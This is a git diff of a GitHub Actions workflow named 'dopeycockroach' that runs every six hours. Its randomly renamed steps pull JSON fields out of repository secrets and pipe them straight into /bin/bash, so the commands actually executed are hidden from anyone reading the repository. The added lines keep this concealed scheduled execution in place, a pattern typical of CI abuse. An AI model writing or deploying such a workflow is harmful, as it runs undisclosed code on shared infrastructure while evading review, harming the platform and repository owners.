@@ -1,25 +1,19 @@
 name: dopeycockroach
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
-jobs:  # 19061
+    - cron: '37 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dopeycockroach
         env:
-          omjn6: ${{ secrets.omjn6 }}
+          bgtxe97: ${{ secrets.bgtxe97 }}
         run: |
-          echo $omjn6 | jq -r .p34291 | /bin/bash
-          echo $p691 | jq -r .ljti220 | /bin/bash
-          echo $oqkbu7 | jq -r .lp73934 | /bin/bash
-          echo $uno75 | jq -r .c2 | /bin/bash
-          echo $rk85545 | jq -r .mole436 | /bin/bash
-          echo $vxkln86458 | jq -r .qdh840 | /bin/bash
-          echo $txyb12 | jq -r .q67 | /bin/bash
-          echo $hpggk864 | jq -r .ct9 | /bin/bash
+          echo $bgtxe97 | jq -r .knlt08327 | /bin/bash
+          echo $hv516 | jq -r .psjin33356 | /bin/bash
+          echo $bmw58275 | jq -r .rv28830 | /bin/bash
+          echo $sn806 | jq -r .wpwo0 | /bin/bash
 
